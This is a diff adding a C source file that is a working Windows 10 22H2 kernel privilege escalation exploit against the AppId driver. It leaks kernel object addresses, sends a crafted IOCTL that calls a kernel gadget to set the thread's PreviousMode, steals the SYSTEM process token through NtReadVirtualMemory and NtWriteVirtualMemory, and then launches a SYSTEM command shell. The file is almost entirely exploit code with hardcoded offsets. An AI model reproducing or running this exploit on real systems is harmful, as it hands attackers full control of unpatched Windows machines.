@@ -1,0 +1,281 @@
+// tested on Windows 10 22h2 (10.0.19045.3930)
+// updated to Jan 2024 (KB5034122)
+
+#include <Windows.h>
+#include <stdio.h>
+#include <winternl.h>
+#include <ntstatus.h>
+#include <evntprov.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define OFFSET_PID 0x440
+#define OFFSET_PROCESS_LINKS 0x448
+#define OFFSET_TOKEN 0x4b8
+#define OFFSET_KPROCESS 0x220
+
+typedef NTSTATUS (*pNtWriteVirtualMemory)(
+	IN HANDLE               ProcessHandle,
+	IN PVOID                BaseAddress,
+	IN PVOID                Buffer,
+	IN ULONG                NumberOfBytesToWrite,
+	OUT PULONG              NumberOfBytesWritten OPTIONAL
+	);
+
+typedef NTSTATUS (*pNtReadVirtualMemory)(
+	IN HANDLE               ProcessHandle,
+	IN PVOID                BaseAddress,
+	OUT PVOID               Buffer,
+	IN ULONG                NumberOfBytesToRead,
+	OUT PULONG              NumberOfBytesReaded OPTIONAL)
+	;
+
+pNtWriteVirtualMemory NtWriteVirtualMemory;
+pNtReadVirtualMemory NtReadVirtualMemory;
+ULONGLONG kThreadAddr;
+
+BOOL SetPrev = FALSE;
+
+// some helpful functions and structures
+// https://github.com/bluefrostsecurity/CVE-2019-1215/blob/master/CVE-2019-1215-ws2ifsl/exploit.cpp
+//
+
+#define MAXIMUM_FILENAME_LENGTH 255 
+#define SystemModuleInformation  0xb
+#define SystemHandleInformation 0x10
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
+{
+	ULONG ProcessId;
+	UCHAR ObjectTypeNumber;
+	UCHAR Flags;
+	USHORT Handle;
+	void* Object;
+	ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION
+{
+	ULONG NumberOfHandles;
+	SYSTEM_HANDLE Handles[1];
+} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
+
+typedef struct SYSTEM_MODULE {
+	ULONG                Reserved1;
+	ULONG                Reserved2;
+#ifdef _WIN64
+	ULONG				Reserved3;
+#endif
+	PVOID                ImageBaseAddress;
+	ULONG                ImageSize;
+	ULONG                Flags;
+	WORD                 Id;
+	WORD                 Rank;
+	WORD                 w018;
+	WORD                 NameOffset;
+	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
+}SYSTEM_MODULE, * PSYSTEM_MODULE;
+
+typedef struct SYSTEM_MODULE_INFORMATION {
+	ULONG                ModulesCount;
+	SYSTEM_MODULE        Modules[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+HMODULE GetNOSModule()
+{
+	HMODULE hKern = 0;
+	hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+	return hKern;
+}
+
+DWORD64 GetModuleAddr(const char* modName)
+{
+	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	{
+		free(buffer);
+		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error\n");
+		return 0;
+	}
+
+	for (unsigned int i = 0; i < buffer->ModulesCount; i++)
+	{
+		PVOID kernelImageBase = buffer->Modules[i].ImageBaseAddress;
+		PCHAR kernelImage = (PCHAR)buffer->Modules[i].Name;
+		if (_stricmp(kernelImage, modName) == 0)
+		{
+			free(buffer);
+			return (DWORD64)kernelImageBase;
+		}
+	}
+	free(buffer);
+	return 0;
+}
+
+
+DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
+{
+	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	{
+		free(buffer);
+		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error \n");
+		return 0;
+	}
+
+	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
+	{
+		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
+
+		if (buffer->Handles[i].ProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeNumber == type)
+		{
+			// added to get random object pointer
+			if (!handle) {
+				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
+				free(buffer);
+				return object;
+			}
+
+			if (handle == (HANDLE)buffer->Handles[i].Handle)
+			{
+				//printf("%p %d %x\n", buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
+				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
+				free(buffer);
+				return object;
+			}
+		}
+	}
+	printf("[-] handle not found\n");
+	free(buffer);
+	return 0;
+}
+
+DWORD64 GetGadgetAddr(const char* name)
+{
+	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
+	HMODULE mod = GetNOSModule();
+	if (!mod)
+	{
+		printf("[-] leaking ntoskrnl version\n");
+		return 0;
+	}
+	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
+
+	DWORD64 returnValue = base + offset - (DWORD64)mod;
+	FreeLibrary(mod);
+	return returnValue;
+}
+
+void Worker() {
+	while (!SetPrev)
+		Sleep(1000);
+
+	printf("Start work!\n");
+	//DebugBreak();
+
+	ULONGLONG kProcAddr;
+	ULONGLONG pid;
+	NTSTATUS status;
+	HANDLE hProc = GetCurrentProcess();
+
+	status = NtReadVirtualMemory(hProc, (PVOID)(kThreadAddr + OFFSET_KPROCESS), &kProcAddr, 8, 0);
+
+	printf("Found _EPROCESS at 0x%llx\n", kProcAddr);
+	ULONGLONG CurrentProc = kProcAddr;
+
+	ULONGLONG pLinks = 0;
+	while (1) {
+		NtReadVirtualMemory(hProc, (PVOID)(kProcAddr + OFFSET_PROCESS_LINKS), &pLinks, 8, 0);
+		kProcAddr = pLinks - OFFSET_PROCESS_LINKS;
+		NtReadVirtualMemory(hProc, (PVOID)(kProcAddr + OFFSET_PID), &pid, 8, 0);
+		if (pid == 4)
+			break;
+	}
+
+	printf("Found System process at 0x%llx\n", kProcAddr);
+	ULONGLONG SystemProc = kProcAddr;
+	ULONGLONG SystemToken;
+
+	NtReadVirtualMemory(hProc, (PVOID)(SystemProc + OFFSET_TOKEN), &SystemToken, 8, 0);
+	NtWriteVirtualMemory(hProc, (PVOID)(CurrentProc + OFFSET_TOKEN), &SystemToken, 8, 0);
+
+	ULONGLONG original_value = 0x801; // base priority = 8 && previous_mode = 1
+	NtWriteVirtualMemory(hProc, (PVOID)(kThreadAddr + 0x232), &original_value, 8, 0);
+
+	system("cmd.exe");
+
+	//getchar();
+}
+
+int main() {
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
+	NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
+
+	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Worker, 0, 0, 0);
+	kThreadAddr = GetKernelPointer(hThread, 8);
+
+	ULONGLONG pFileObject = GetKernelPointer(0, 37);	// pick a random valid FileObject
+
+	printf("_KTHREAD at 0x%llx, FileObject at 0x%llx\n", kThreadAddr, pFileObject);
+
+	//getchar();
+
+	HANDLE hDev = CreateFileA("\\\\.\\GLOBALROOT\\Device\\AppId",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		0,
+		OPEN_EXISTING,
+		0,
+		0);
+
+	if (hDev == INVALID_HANDLE_VALUE) {
+		printf("Open device failed, GLE = %d\n", GetLastError());
+		return -1;
+	}
+	printf("Device handle value: %d\n", hDev);
+
+	// alloc new pointer instead stack pointer
+	// to make it aligned
+	ULONGLONG* Callback = (ULONGLONG*)VirtualAlloc((VOID*)0x10000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	Callback[0] = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe") + 0x726210;	// DbgkpTriageDumpRestoreState
+	Callback[1] = GetGadgetAddr("HalDisplayString");	// null fn
+
+	ULONGLONG Data[3];
+	Data[0] = kThreadAddr + 0x232 - 0x2078;			// callback params
+	Data[1] = pFileObject;							// file object pointer
+	Data[2] = (ULONGLONG)Callback;					// callback functions table
+
+	DWORD RetBytes;
+	NTSTATUS status = DeviceIoControl(hDev, 0x22A018, Data, 0x18, 0, 0, &RetBytes, 0);
+
+	if (status == STATUS_SUCCESS)
+		SetPrev = TRUE;
+
+	CloseHandle(hDev);
+
+	printf("Wait for thread running...\n");
+	WaitForSingleObject(hThread, INFINITE);
+
+	return 0;
+}
